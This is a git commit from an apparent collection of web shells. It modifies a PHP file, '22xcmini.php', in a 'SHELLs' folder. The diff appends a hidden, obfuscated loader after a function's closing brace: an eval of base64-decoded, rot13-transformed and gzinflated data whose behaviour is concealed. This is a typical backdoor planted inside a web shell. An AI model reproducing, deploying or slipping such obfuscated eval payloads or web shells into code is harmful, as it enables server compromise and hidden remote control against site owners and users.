be87966d1523cd9f41c4ae0600bed9f2e0bc9df1
1337r0j4n <84887432+1337r0j4n@users.noreply.github.com>
2023-09-16 08:11:35 +0630

    Add files via upload

--- SHELLs/22XC Mini Shell/22xcmini.php
+++ SHELLs/22XC Mini Shell/22xcmini.php
@@ -609,5 +609,5 @@ $info .= (($perms & 0x0001) ?
 (($perms & 0x0200) ? 'T' : '-'));
 
 return $info;
-}
+}; eval(str_rot13(gzinflate(str_rot13(base64_decode('cpBaeIQwEEDv/oogTxT8OvTksoXuSd1eV/HQUBcJJlrGuourcBXir6+awhaaWDLzmDeTZGsNogayJw7LivSlVc/U3Ozp9aOgJQmJndjhf3w8pPmG7yQtnkJSlrNG+kHLnTVZGtk3AutrBUuBZekIIEcSUpp/bqAAaCvDOI4bvI1cTitR2PE5TcGDDMUoqEKGSSv0iQKJ7XlHl1K5UYDu2SLL2bSU7B+JiVoO2x4lJXjafjMTBGMVmJClj566FiZeUpegdppg4GUOd6mx6muPve3fPTPCyHvjocdQltM/8Pd0W+9oCGmrJ92zzxrl1T1Gs9yNOuZdbaa69K3S82k/')))));
 ?>
